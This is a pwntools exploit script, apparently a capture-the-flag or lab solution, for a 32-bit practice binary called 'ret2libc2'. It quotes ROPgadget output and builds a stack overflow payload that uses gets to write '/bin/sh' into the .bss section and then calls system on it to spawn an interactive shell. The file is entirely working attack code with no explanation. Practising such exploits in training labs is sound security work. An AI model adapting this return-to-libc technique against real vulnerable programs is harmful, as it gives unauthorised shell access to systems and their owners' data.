from pwn import *

p = process("./ret2libc2")
gdb.attach(p,"b *0x08048595")
elf = ELF("./ret2libc2")
"""
ROPgadget --binary ./ret2libc2 --only "pop|ret"
Gadgets information
============================================================
0x0804861b : pop ebp ; ret
0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804839d : pop ebx ; ret
0x0804861a : pop edi ; pop ebp ; ret
0x08048619 : pop esi ; pop edi ; pop ebp ; ret
0x08048386 : ret
0x0804848e : ret 0xeac1

Unique gadgets found: 7
"""

system = elf.plt["system"]
gets = elf.plt["gets"]
cmd = "/bin/sh"
bss_addr = 0x0804A200
pop1_ret = 0x0804861b
p.recvuntil("ret2libc2\n")
payload = "a" * 0x108 + "junk"
payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)
payload += p32(system) + p32(pop1_ret) + p32(bss_addr)
p.sendline(payload)
p.sendline(cmd)
p.interactive()
